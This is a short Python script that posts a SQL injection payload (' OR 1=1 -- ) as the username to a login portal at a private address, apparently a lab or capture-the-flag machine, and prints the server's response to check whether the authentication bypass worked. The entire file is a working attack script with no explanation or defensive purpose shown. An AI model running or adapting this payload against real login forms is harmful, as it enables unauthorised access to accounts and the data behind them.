import urllib.parse
import urllib.request

payload = urllib.parse.urlencode({
    'username': "' OR 1=1 -- ",
    'password': 'x',
}).encode()
req = urllib.request.Request('http://10.10.10.5/portal', method='POST', data=payload)
req.add_header('Content-Type', 'application/x-www-form-urlencoded')
resp = urllib.request.urlopen(req)
print('status=', resp.status)
body = resp.read().decode('utf-8', 'replace')
print(body[:1200])
